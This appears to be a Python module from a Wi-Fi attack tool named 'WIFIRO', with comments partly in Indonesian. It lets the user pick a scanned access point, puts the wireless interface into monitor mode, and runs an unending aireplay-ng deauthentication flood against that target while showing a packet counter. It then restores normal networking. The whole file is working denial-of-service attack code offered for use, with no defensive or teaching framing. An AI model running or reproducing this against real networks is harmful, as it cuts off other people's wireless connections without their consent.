import os
import sys
import time
import subprocess

class DeauthAttack:
    def __init__(self, manager, colors):
        self.manager = manager
        self.colors = colors

    def start_dos(self, targets):
        """WIFIRO - Full Auto-Restore Deauth Attack"""
        c = self.colors
        if not targets:
            print(f"\n{c.ERR} {c.R}Target list is empty. Scan first (01).{c.NC}")
            return

        try:
            # 1. Pilih Target
            print(f"\n{c.Q} Select Target ID to Broadcast (1-{len(targets)}):")
            val = input(f"  {c.DG}Selection > {c.NC}").strip()
            if not val: return
            
            target = targets[int(val) - 1]
            ctx = {
                'bssid': target.get('bssid'),
                'ch': target.get('ch'),
                'essid': target.get('essid', 'Unknown'),
                'iface': self.manager.iface 
            }

            # --- PAKSA MONITOR MODE (Wajib untuk DoS) ---
            print(f"{c.INFO} {c.Y}Preparing Interface: Ensuring Monitor Mode is ON...{c.NC}")
            # Kita panggil set_monitor_mode, fungsi ini di process.py sudah ada 'check kill'
            if not self.manager.set_monitor_mode(ctx['iface']):
                print(f"{c.ERR} {c.R}Critical Error: Gagal mengaktifkan Monitor Mode!{c.NC}")
                return
            
            # Update nama interface (karena airmon-ng sering mengubah wlan0 -> wlan0mon)
            ctx['iface'] = self.manager.iface

            # 2. Jalankan Perintah Serangan
            cmd = f"stdbuf -oL iw dev {ctx['iface']} set channel {ctx['ch']} && stdbuf -oL aireplay-ng -0 0 -a {ctx['bssid']} --ignore-negative-one {ctx['iface']}"
            
            # Eksekusi serangan
            self._execute_attack(ctx['essid'], ctx['bssid'], cmd)

        except (ValueError, IndexError):
            print(f"{c.ERR} Target ID tidak valid.")
            time.sleep(1)
        except KeyboardInterrupt:
            pass
        finally:
            # --- SAPUJAGAT RESTORE ---
            # Tidak peduli status awal, setiap keluar dari DoS, paksa balik ke Managed Mode
            print(f"\n{c.INFO} {c.G}Finishing Attack: Cleaning up and restoring network services...{c.NC}")
            
            # Memanggil fungsi sakti di process.py yang mematikan airmon dan menyalakan NetworkManager
            self.manager.set_managed_mode(self.manager.iface)
            
            print(f"{c.OK} {c.G}WiFi RO: System Cleaned. Internet Restored.{c.NC}")
            time.sleep(1)

    def _execute_attack(self, essid, bssid, cmd):
        c = self.colors
        print(f"\n  {c.BOLD}{c.W}MODULE:{c.NC} {c.C}BROADCAST_DEAUTH{c.NC}")
        print(f"  {c.BOLD}{c.W}TARGET:{c.NC} {c.Y}{essid}{c.NC} {c.DG}({bssid}){c.NC}")
        print(f"  {c.INFO} {c.R}Press CTRL+C to Stop Attack{c.NC}")
        print(f"  {c.DG}─────────────────────────────────────────────{c.NC}")

        process = subprocess.Popen(
            cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, 
            universal_newlines=True, bufsize=1
        )

        sent_packets = 0
        start_time = time.time()

        try:
            while True:
                line = process.stdout.readline()
                if line and any(x in line for x in ["Sending", "DeAuth", "ACK"]):
                    sent_packets += 1
                
                bar_idx = int((time.time() * 8) % 20)
                bar = "░" * bar_idx + "█" + "░" * (19 - bar_idx)
                
                status = (
                    f"\r  {c.OK} {c.W}Status: {c.G}[{bar}]{c.NC} "
                    f"{c.W}Sent: {c.Y}{sent_packets:04d}{c.NC} "
                    f"{c.DG}({int(time.time() - start_time)}s){c.NC}"
                )
                sys.stdout.write(status)
                sys.stdout.flush()

                if process.poll() is not None: break
        except KeyboardInterrupt:
            print(f"\n\n{c.WARN} {c.R}User Aborted. Terminating attack processes...{c.NC}")
        finally:
            process.terminate()
            process.wait()
            print(f"{c.OK} {c.G}DoS Engine Stopped.{c.NC}")
